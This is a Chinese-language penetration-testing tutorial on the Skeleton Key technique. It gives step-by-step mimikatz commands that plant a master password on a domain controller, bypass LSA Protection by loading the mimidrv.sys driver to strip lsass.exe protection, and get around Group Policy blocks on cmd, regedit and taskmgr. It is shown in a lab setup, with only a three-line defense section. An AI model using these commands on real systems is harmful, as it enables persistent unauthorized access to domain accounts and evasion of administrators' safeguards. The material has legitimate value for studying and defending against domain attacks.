# 域渗透——Skeleton Key

0x00 前言
=======

* * *

上篇介绍了利用SSP来维持域控权限，美中不足在于其需要域控重启才能生效，而在众多的域渗透方法中，当然存在不需要域控重启即能生效的方法，所以这次就介绍其中的一个方法——Skeleton Key

![Alt text](http://drops.javaweb.org/uploads/images/28454182c38ae328dcfac540ca87d7e1aa2d16dd.jpg)

0x01 简介
=======

* * *

> Skeleton Key被安装在64位的域控服务器上  
> 支持Windows Server2003—Windows Server2012 R2  
> 能够让所有域用户使用同一个万能密码进行登录  
> 现有的所有域用户使用原密码仍能继续登录  
> 重启后失效  
> Mimikatz(Version 2.0 alpha,20150107)支持 Skeleton Key

**参考代码：**  
[https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_misc.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_misc.c)

0x02 实际测试
=========

* * *

**测试环境**

```
域控：Server 2008 R2 x64
域内主机： Win7 x64

```

### 1、域内主机使用正确密码登录域控

用户名：a@test.local  
密码：12345678!Q

**cmd命令：**

```
net use \\WIN-8VVLRPIAJB0.test.local 12345678!Q /user:a@test.local
dir \\WIN-8VVLRPIAJB0.test.local\c$

```

如图![Alt text](http://drops.javaweb.org/uploads/images/51593b831b9e1142122993f1abd0758b447cd4ee.jpg)

### 2、在域控安装Skeleton Key

**mimikatz命令：**

```
privilege::debug
misc::skeleton

```

如图![Alt text](http://drops.javaweb.org/uploads/images/4d213bcc2ceee7624cb0b69cd4968435c7b0d93c.jpg)

**注：**  
64系统需要使用64位的mimikatz

### 3、域内主机使用Skeleton Key登录域控

**（1）**清除net use连接

**cmd命令：**

```
net use */del /y

```

如图![Alt text](http://drops.javaweb.org/uploads/images/5e49cf95fcaf8ce1957096f328da730a8acd26a1.jpg)

**（2）**使用Skeleton Key登录

mimikatz的默认Skeleton Key设置为mimikatz

**cmd命令：**

```
net use \\WIN-8VVLRPIAJB0.test.local mimikatz /user:a@test.local
dir \\WIN-8VVLRPIAJB0.test.local\c$

```

如图![Alt text](http://drops.javaweb.org/uploads/images/1f0a9c5bdb715d1d0b631ccc4ff8d6bb9aa43a9c.jpg)

**（3）**权限测试

**a、**使用域内不存在的用户+Skeleton Key登录

**b、**使用域内普通权限用户+Skeleton Key登录

如图![Alt text](http://drops.javaweb.org/uploads/images/e70bbd8f656ea150cccaec6133d8dffc199c95dd.jpg)

发现使用域内不存在的用户无法登录

使用域内普通权限用户无法访问域控

**结论：**Skeleton Key只是给所有账户添加了一个万能密码，无法修改账户的权限

### 4、LSA Protection

微软在2014年3月12日添加了LSA保护策略，用来防止对进程lsass.exe的代码注入，这样一来就无法使用mimikatz对lsass.exe进行注入，相关操作也会失败。

**适用系统：**

```
Windows 8.1
Windows Server 2012 R2

```

所以接下来换用Windows Server 2012 R2 x64进行测试

**（1）**配置LSA Protection

注册表位置：  
`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa`

如图![Alt text](http://drops.javaweb.org/uploads/images/6b699f820beece9f74de34fe05967986a4aed200.jpg)

新建-`DWORD`值，名称为`RunAsPPL`,数值为`00000001`

如图![Alt text](http://drops.javaweb.org/uploads/images/46966997d6e8e755476656fa4c2af01d9d0a0b8c.jpg)

重启系统

**（2）**测试Skeleton Key

**mimikatz命令：**

```
privilege::debug
misc::skeleton

```

此时失败![Alt text](http://drops.javaweb.org/uploads/images/bd00eabede9db9d1ea05ae5fe1b2537f9638cb3d.jpg)

**（3）**绕过LSA Protection

mimikatz早在2013年10月就已支持绕过LSA Protection

如图![Alt text](http://drops.javaweb.org/uploads/images/3446b0cb0a66cb03c88a36920e7134aa73e98f47.jpg)

**参考源码：**  
[https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_kernel.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_kernel.c)

**注：**  
该功能需要mimidrv.sys文件

![Alt text](http://drops.javaweb.org/uploads/images/c1eb713ef6266094794a8c8671f873b732d7ad25.jpg)

**mimikatz命令：**

```
privilege::debug
!+
!processprotect /process:lsass.exe /remove
misc::skeleton

```

如图，导入驱动文件mimidrv.sys后，绕过LSA Protection，操作成功

![Alt text](http://drops.javaweb.org/uploads/images/9518fe208632b7d4cb0fd9f9af6193bcb80d1a27.jpg)

0x03 补充
=======

* * *

分享一些常见问题的解决方法，管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr

### 1、如何禁用cmd、regedit、taskmgr

输出`gpedit.msc`进入本地组策略编辑器

本地计算机测试-用户配置-管理模板-系统

如图![Alt text](http://drops.javaweb.org/uploads/images/6f899384c3016ab189de56e02cdf175f8ddb3c81.jpg)

**禁用cmd：**

选择"阻止访问命令提示符"-启用![Alt text](http://drops.javaweb.org/uploads/images/61d16d1360e047a0a34471f224a3b9d0779c2dc2.jpg)

**禁用regedit：**

选择"阻止访问注册表编辑工具"-启用![Alt text](http://drops.javaweb.org/uploads/images/7570f7f257ff02c3eee2f28540eef5beb1abe0cc.jpg)

**禁用taskmgr:**

选择"不要运行指定的Windows应用程序"-不允许的应用程序列表-填入taskmgr.exe-启用![Alt text](http://drops.javaweb.org/uploads/images/7f1555691a9519176497369b6785e49a4e1d808e.jpg)

**测试：**

![Alt text](http://drops.javaweb.org/uploads/images/385bb28a5c4f0c20fbfb23546867298a80fdfd77.jpg)

如图cmd、regedit、taskmgr均已被禁用

### 2、绕过

**mimikatz命令：**

```
privilege::debug
misc::cmd
misc::regedit
misc::taskmgr

```

如图，成功执行，绕过限制

![Alt text](http://drops.javaweb.org/uploads/images/79b70a6590ece9ca800babbc9a614bc3fd95241f.jpg)

0x04 防御
=======

* * *

*   保护域控权限
*   查看域控日志
*   对照攻击方法寻找入侵痕迹

0x05 小结
=======

* * *

这次不仅测试了`Skeleton Key`，还介绍了`mimikatz`的一些隐藏功能，而这些功能并未在其官方说明文档中出现。

其实通过研究`mimikatz`的源码，你会发现还有许多的隐藏功能值得挖掘利用。

还是那句老话，只有了解如何攻击才能更好的防御，希望本文无论是对渗透攻击还是防御，均有帮助。

0x06 参考资料
=========

* * *

*   [https://adsecurity.org/?p=1275](https://adsecurity.org/?p=1275)
*   [https://adsecurity.org/?p=1255](https://adsecurity.org/?p=1255)
*   [http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-key-malware-analysis/](http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-key-malware-analysis/)
*   [https://technet.microsoft.com/en-us/library/dn408187.aspx](https://technet.microsoft.com/en-us/library/dn408187.aspx)
*   [https://github.com/gentilkiwi/mimikatz/commit/2d9e15bb8320df727d36564bc16df50ea9e557e4](https://github.com/gentilkiwi/mimikatz/commit/2d9e15bb8320df727d36564bc16df50ea9e557e4)
*   [https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_kernel.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_kernel.c)

**本文由三好学生原创并首发于乌云drops，转载请注明**